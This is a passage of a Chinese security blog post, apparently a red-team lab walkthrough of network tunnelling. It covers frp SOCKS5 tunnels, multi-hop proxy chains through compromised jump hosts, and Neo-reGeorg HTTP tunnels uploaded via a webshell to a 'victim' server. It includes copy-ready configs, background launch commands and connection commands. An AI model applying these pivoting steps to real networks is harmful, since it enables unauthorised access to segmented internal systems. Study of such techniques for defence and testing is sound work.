+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430190039259.png" data-caption="image-20230430190039259"><img src="/../images/tunnel/image-20230430190039259.png" alt="image-20230430190039259"></a></p>
+<p>本机代理 socks5 后可直接访问隔离网段 192.168.20.200 的 web 服务</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430171653727.png" data-caption="image-20230430171653727"><img src="/../images/tunnel/image-20230430171653727.png" alt="image-20230430171653727"></a></p>
+<p>隧道流量如下</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430190320771.png" data-caption="image-20230430190320771"><img src="/../images/tunnel/image-20230430190320771.png" alt="image-20230430190320771"></a></p>
+<h2 id="五、Socks-隧道"><a href="#五、Socks-隧道" class="headerlink" title="五、Socks 隧道"></a>五、Socks 隧道</h2><p>SOCKS（Socket Secure）是一种网络协议，它允许客户端通过一个代理服务器访问互联网。与 HTTP 代理不同，SOCKS 代理可以支持任何类型的网络流量，包括 TCP 和 UDP 流量。SOCKS 协议有多个版本，其中 SOCKS5 是最新的版本，它支持加密认证和数据加密等功能。当客户端使用 SOCKS 代理时，它会向代理服务器发送一个连接请求，请求连接到目标服务器。代理服务器会建立与目标服务器之间的连接，并将数据转发给客户端。客户端可以在本地计算机上运行，也可以在另一个网络中运行，例如内网中的计算机。使用 SOCKS 代理可以绕过某些网络限制，也可以保护用户的隐私，因为代理服务器可以隐藏客户端的真实 IP 地址。</p>
+<h3 id="隧道搭建-3"><a href="#隧道搭建-3" class="headerlink" title="隧道搭建"></a>隧道搭建</h3><p>Socks 隧道搭建使用 FRP + proxifier 实现，frp项目地址：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a> ,搭建过程中使用到的端口需要在防火墙开放，需要注意不同系统需下载不同版本，如攻击机（服务端）为linux 则需要下载 linux 版本，受害者（客户端）为 windwos 则需要下载 windwos 版本，以下配置直接复制到 frps.ini、frpc.ini 文件运行即可，运行后使用 socks5 代理工具 proxifier 即可进行流量代理。</p>
+<p>1、配置文件如下（根据自身需求进行修改）</p>
+<p>服务端-frps.ini</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0        # 绑定的ip，为本机</span><br><span class="line">bind_port = 7000           # 绑定的端口</span><br><span class="line">dashboard_addr = 0.0.0.0   # 管理地址</span><br><span class="line">dashboard_port = 7500      # web管理端口</span><br><span class="line">dashboard_user = root      # web管理的用户名</span><br><span class="line">dashboard_pwd  = root      # web管理用户的密码</span><br><span class="line">token = 1q2w3e             # 客户端服务端连接的密码，客户端也需要配置相同的token</span><br><span class="line">heartbeat_timeout = 90     # 心跳超时时间</span><br><span class="line">max_pool_count = 5         # 最大同时连接数</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>客户端-配置frpc.ini</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">tls_enable = true</span><br><span class="line">server_addr = x.x.x.x				# 服务端IP（根据自己实际 VPS IP 填写）</span><br><span class="line">server_port = 7000					# 服务端监听的端口</span><br><span class="line">token = 1q2w3e						# 与服务端的 token 一致才能成功验证</span><br><span class="line">pool_count = 5						# 最大连接数</span><br><span class="line">protocol = tcp</span><br><span class="line">health_check_type = tcp</span><br><span class="line">health_check_interval_s = 100</span><br><span class="line">[test]								# 代理名称，可自行修改</span><br><span class="line">remote_port = 40000					# 代理的端口，连接 proxifier 时需要用</span><br><span class="line">plugin = socks5						# 使用的协议</span><br><span class="line">use_encryption = true				# 是否加密</span><br><span class="line">use_compression = true</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>3、使用方法</p>
+<p>配置完服务端与客户端的配置文件后，服务端启动服务</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini </span><br><span class="line"></span><br><span class="line"># 挂在后台运行命令</span><br><span class="line">nohup ./frps -c frps.ini &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230425123300299.png" data-caption="image-20230425123300299"><img src="/../images/tunnel/image-20230425123300299.png" alt="image-20230425123300299"></a></p>
+<p>客户端启动服务，进行连接</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c frpc.ini</span><br><span class="line"></span><br><span class="line"># 后台运行命令</span><br><span class="line">nohup ./frpc -c frpc.ini &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230425123538555.png" data-caption="image-20230425123538555"><img src="/../images/tunnel/image-20230425123538555.png" alt="image-20230425123538555"></a></p>
+<p>利用 proxifier 进行连接</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430191349822.png" data-caption="image-20230430191349822"><img src="/../images/tunnel/image-20230430191349822.png" alt="image-20230430191349822"></a></p>
+<p>访问内网资源，实现突破网络边界</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230425124058682.png" data-caption="image-20230425124058682"><img src="/../images/tunnel/image-20230425124058682.png" alt="image-20230425124058682"></a></p>
+<p>隧道流量如下</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430191552717.png" data-caption="image-20230430191552717"><img src="/../images/tunnel/image-20230430191552717.png" alt="image-20230430191552717"></a></p>
+<h4 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h4><h5 id="frp-多级代理"><a href="#frp-多级代理" class="headerlink" title="frp 多级代理"></a>frp 多级代理</h5><p>通过跳板机-1 将流量代理到服务器（vps）上搭建第一层 frp 代理，获取 192.168.20.200 主机。然后通过 192.168.20.200 搭建第二层代理访问 10.10.20.30 的网络资源。</p>
+<p>跳板机-1</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502145949254.png" data-caption="image-20230502145949254"><img src="/../images/tunnel/image-20230502145949254.png" alt="image-20230502145949254"></a></p>
+<p>跳板机-2</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502153345821.png" data-caption="image-20230502153345821"><img src="/../images/tunnel/image-20230502153345821.png" alt="image-20230502153345821"></a></p>
+<p>需要访问的多层网络内网主机</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502153956115.png" data-caption="image-20230502153956115"><img src="/../images/tunnel/image-20230502153956115.png" alt="image-20230502153956115"></a></p>
+<p>1、第一层代理搭建</p>
+<p>服务端（vps）frps.ini 配置文件</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 2222</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>客户端（受害者主机 192.168.11.128）frpc.ini 配置文件</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = x.x.x.x</span><br><span class="line">server_port = 2222</span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 192.168.20.100</span><br><span class="line">remote_port = 3333。</span><br><span class="line">local_port 3333</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>启动服务端</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502161505106.png" data-caption="image-20230502161505106"><img src="/../images/tunnel/image-20230502161505106.png" alt="image-20230502161505106"></a></p>
+<p>启动客户端</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502161839332.png" data-caption="image-20230502161839332"><img src="/../images/tunnel/image-20230502161839332.png" alt="image-20230502161839332"></a></p>
+<p>本机 proxifier 连接 隧道</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502164653706.png" data-caption="image-20230502164653706"><img src="/../images/tunnel/image-20230502164653706.png" alt="image-20230502164653706"></a></p>
+<p>能访问受害主机的另一网卡 192.168.20.100 的内网资源</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502165032679.png" data-caption="image-20230502165032679"><img src="/../images/tunnel/image-20230502165032679.png" alt="image-20230502165032679"></a></p>
+<p>2、第二层网络搭建</p>
+<p>搭建第二层网络时，跳板机-1既是 frp 的服务端，也是客户端，指向的 IP 不一样，具体请观察配置文件差异</p>
+<p>192.168.11.128 上启动 frps  配置文件如下（注意，此前的 frpc 服务不要关闭）</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 192.168.20.100</span><br><span class="line">bind_port = 2222</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502175550215.png" data-caption="image-20230502175550215"><img src="/../images/tunnel/image-20230502175550215.png" alt="image-20230502175550215"></a></p>
+<p>因为这里是假设已经获取了跳板机-2，192.168.20.200 的主机权限，这里启动 frpc ，配置文件如下</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.20.100</span><br><span class="line">server_port = 2222</span><br><span class="line"></span><br><span class="line">[web]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 192.168.20.200</span><br><span class="line">local_port = 3333</span><br><span class="line">remote_port = 3333</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502175531322.png" data-caption="image-20230502175531322"><img src="/../images/tunnel/image-20230502175531322.png" alt="image-20230502175531322"></a></p>
+<p>3、当 frp 全部服务都开启后，通过 proxifier 设置代理链，然后就可以在本机上访问第二层内网资源了， Proxifier 设置解释为，我们网络首先通过第一层 VPS 的代理网络，然后通过设置 192.168.20.100 的代理进入第二层网络，从而实现多级代理。</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502181506434.png" data-caption="image-20230502181506434"><img src="/../images/tunnel/image-20230502181506434.png" alt="image-20230502181506434"></a></p>
+<p>设置代理链后，可在本机访问第二层的内网资源（下图为10.10.20.30 下 web 服务图片，假装 weblogic）</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502180938037.png" data-caption="image-20230502180938037"><img src="/../images/tunnel/image-20230502180938037.png" alt="image-20230502180938037"></a></p>
+<blockquote>
+<p>注意，frp 配置文件的端口，需要防火墙开放才能搭建成功，具体端口，根据实际情况设置。</p>
+</blockquote>
+<h2 id="六、HTTP-隧道"><a href="#六、HTTP-隧道" class="headerlink" title="六、HTTP 隧道"></a>六、HTTP 隧道</h2><p>HTTP 隧道是一种使用 HTTP 协议进行数据传输的技术，它可以将内网中的服务映射到公网地址上，实现内网穿透的功能。</p>
+<h3 id="隧道搭建-4"><a href="#隧道搭建-4" class="headerlink" title="隧道搭建"></a>隧道搭建</h3><p>HTTP 隧道搭建使用Neo-reGeorg，项目地址  <a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
+<p>攻击机，不可通内网</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430222233947.png" data-caption="image-20230430222233947"><img src="/../images/tunnel/image-20230430222233947.png" alt="image-20230430222233947"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230501121018884.png" data-caption="image-20230501121018884"><img src="/../images/tunnel/image-20230501121018884.png" alt="image-20230501121018884"></a></p>
+<p>受害者（双网卡），模拟 WEB 服务器</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430200246139.png" data-caption="image-20230430200246139"><img src="/../images/tunnel/image-20230430200246139.png" alt="image-20230430200246139"></a></p>
+<p>1、在攻击机上使用 Python 生成 tunnel.(aspx|ashx|jsp|jspx|php)  脚本，设置密码并上传到 WEB 服务器</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py generate -k password</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430222855435.png" data-caption="image-20230430222855435"><img src="/../images/tunnel/image-20230430222855435.png" alt="image-20230430222855435"></a></p>
+<p>2、在获取 webshell 的情况下，根据网站语言类型上传相应的脚本值 web 服务器中</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430201343337.png" data-caption="image-20230430201343337"><img src="/../images/tunnel/image-20230430201343337.png" alt="image-20230430201343337"></a></p>
+<p>3、连接隧道</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py -k password -u http://192.168.11.133:8003/tunnel.php -p 2333</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430223344270.png" data-caption="image-20230430223344270"><img src="/../images/tunnel/image-20230430223344270.png" alt="image-20230430223344270"></a></p>
+<p>4、利用 proxifier 连接 socks，访问内网资源</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430230435504.png" data-caption="image-20230430230435504"><img src="/../images/tunnel/image-20230430230435504.png" alt="image-20230430230435504"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430230447663.png" data-caption="image-20230430230447663"><img src="/../images/tunnel/image-20230430230447663.png" alt="image-20230430230447663"></a></p>
+<p>隧道流量如下</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430231412509.png" data-caption="image-20230430231412509"><img src="/../images/tunnel/image-20230430231412509.png" alt="image-20230430231412509"></a></p>
+<h2 id="七、扩展"><a href="#七、扩展" class="headerlink" title="七、扩展"></a>七、扩展</h2><h3 id="出网类型"><a href="#出网类型" class="headerlink" title="出网类型"></a>出网类型</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">| 协议    | 命令                    |</span><br><span class="line">| ------- | ----------------------- |</span><br><span class="line">| ICMP    | ping ip/domain          |</span><br><span class="line">| HTTP    | curl ip or domain       |</span><br><span class="line">| DNS     | nslookup domain 8.8.8.8 |</span><br><span class="line">| TCP/UDP | telnet ip port          |</span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="代理类型"><a href="#代理类型" class="headerlink" title="代理类型"></a>代理类型</h3><p>正向代理（Forward Proxy）：代理服务器向外部网络发送请求，通常被用于内部网络无法直接访问外部网络的情况。在这种情况下，客户端向代理服务器发送请求，并在代理服务器上处理并转发请求，作为客户端的代理，代理服务器会将请求发送到目标服务器，接收响应，然后转发给客户端。（例子：公网 frp 作为客户端，内网主机作为服务端）</p>
+<p>反向代理（Reverse Proxy）：代理服务器向内部网络发送请求，通常被用于外部网络无法直接访问内部网络的情况。在这种情况下，代理服务器接收外部网络的请求并在代理服务器上进行处理，并将请求转发到内部服务器。当内部服务器发送响应时，代理服务器将响应返回给外部客户端，从而隐藏了内部服务器的真实 IP 地址和其他信息。（例子：公网 frp 作为服务端，内网主机作为客户端）</p>
+<h3 id="连接类型"><a href="#连接类型" class="headerlink" title="连接类型"></a>连接类型</h3><p>正向连接：客户端向服务器发起连接请求，服务器接受请求并建立连接（例子：受害者主机具备公网IP可出网，此时受害者主机监听一个端口，攻击者主动连接）</p>
+<p>反向连接：服务器主动向客户端发起连接请求，客户端接受请求并建立连接（例子：内网主机能出网，但没有公网IP，攻击者无法直接连接，此时攻击者监听一个端口，受害者主动连接攻击者端口）</p>
+<h2 id="八、总结"><a href="#八、总结" class="headerlink" title="八、总结"></a>八、总结</h2><p>通过学习隧道相关知识，选取了部分工具重新熟悉了各种隧道的搭建，虽然协议上有些许差异，但其逻辑上大差不差。文章主要还是工具上的使用以及协议上的理解。</p>
+<h2 id="九、参考"><a href="#九、参考" class="headerlink" title="九、参考"></a>九、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/DlhqE6Yxo9IEXBKRl5epIA</span><br><span class="line">https://github.com/esrrhs/pingtunnel</span><br><span class="line">https://forum.butian.net/share/400</span><br><span class="line">https://github.com/iagox86/dnscat2</span><br><span class="line">https://cloud.tencent.com/developer/article/2130053</span><br><span class="line">https://xz.aliyun.com/t/2214</span><br><span class="line">https://blog.csdn.net/qq_44159028/article/details/120748587</span><br><span class="line">https://mp.weixin.qq.com/s/RiFrP2IurA3Z5JcmWE0Vfg</span><br><span class="line">https://mp.weixin.qq.com/s/_g3rXXyq7HxMM1FVhs2Y1g</span><br><span class="line">https://github.com/fatedier/frp</span><br><span class="line">https://github.com/L-codes/Neo-reGeorg</span><br></pre></td></tr></table></figure></div>
+
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">一、前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81ICMP%E9%9A%A7%E9%81%93"><span class="toc-number">2.</span> <span class="toc-text">二、ICMP隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="toc-number">2.1.</span> <span class="toc-text">隧道搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">2.2.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Pingtunnel%E4%B8%8A%E7%BA%BFCobaltstrike"><span class="toc-number">2.2.1.</span> <span class="toc-text">Pingtunnel上线Cobaltstrike</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Pingtunel-%E9%85%8D%E5%90%88-iox-%E4%BB%A3%E7%90%86-socks-%E5%87%BA%E7%BD%91"><span class="toc-number">2.2.2.</span> <span class="toc-text">Pingtunel 配合 iox 代理 socks 出网</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81DNS-%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">三、DNS 隧道搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA-1"><span class="toc-number">3.1.</span> <span class="toc-text">隧道搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-1"><span class="toc-number">3.2.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dnscat2-%E4%B8%8A%E7%BA%BF-Cobastrike"><span class="toc-number">3.2.1.</span> <span class="toc-text">dnscat2 上线 Cobastrike</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SSH-%E9%9A%A7%E9%81%93"><span class="toc-number">4.</span> <span class="toc-text">四、SSH 隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA-2"><span class="toc-number">4.1.</span> <span class="toc-text">隧道搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">4.1.1.</span> <span class="toc-text">本地端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">4.1.2.</span> <span class="toc-text">远程端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91"><span class="toc-number">4.1.3.</span> <span class="toc-text">动态转发</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81Socks-%E9%9A%A7%E9%81%93"><span class="toc-number">5.</span> <span class="toc-text">五、Socks 隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA-3"><span class="toc-number">5.1.</span> <span class="toc-text">隧道搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-2"><span class="toc-number">5.1.1.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#frp-%E5%A4%9A%E7%BA%A7%E4%BB%A3%E7%90%86"><span class="toc-number">5.1.1.1.</span> <span class="toc-text">frp 多级代理</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81HTTP-%E9%9A%A7%E9%81%93"><span class="toc-number">6.</span> <span class="toc-text">六、HTTP 隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA-4"><span class="toc-number">6.1.</span> <span class="toc-text">隧道搭建</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%89%A9%E5%B1%95"><span class="toc-number">7.</span> <span class="toc-text">七、扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BA%E7%BD%91%E7%B1%BB%E5%9E%8B"><span class="toc-number">7.1.</span> <span class="toc-text">出网类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E7%B1%BB%E5%9E%8B"><span class="toc-number">7.2.</span> <span class="toc-text">代理类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">7.3.</span> <span class="toc-text">连接类型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">八、总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E5%8F%82%E8%80%83"><span class="toc-number">9.</span> <span class="toc-text">九、参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/&text=网络隧道：突破内网的通行证"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/&title=网络隧道：突破内网的通行证"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/&is_video=false&description=网络隧道：突破内网的通行证"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=网络隧道：突破内网的通行证&body=Check out this article: http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/&title=网络隧道：突破内网的通行证"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/&title=网络隧道：突破内网的通行证"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/&title=网络隧道：突破内网的通行证"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
